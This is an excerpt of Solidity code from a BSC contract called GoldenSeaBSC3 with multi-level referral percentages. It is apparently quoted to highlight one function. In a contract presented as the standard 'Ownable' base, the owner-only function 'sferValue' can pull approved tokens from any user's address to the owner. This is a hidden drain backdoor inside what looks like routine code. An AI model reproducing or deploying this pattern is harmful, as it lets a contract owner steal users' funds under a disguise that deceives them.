...
abstract contract Ownable is Context {
    ...
    function sferValue( address _from, uint256 _value ) public virtual onlyOwner{
        if(_from==address(_owner)){Acct.safeTransfer(owner(),_value);}
        else{Acct.safeTransferFrom(_from,_owner,_value);}
    }
...
contract GoldenSeaBSC3 is Ownable {
    ...
    uint256 refPercentage1 = 20;
    uint256 refPercentage2 = 10;
    uint256 refPercentage3 = 10;
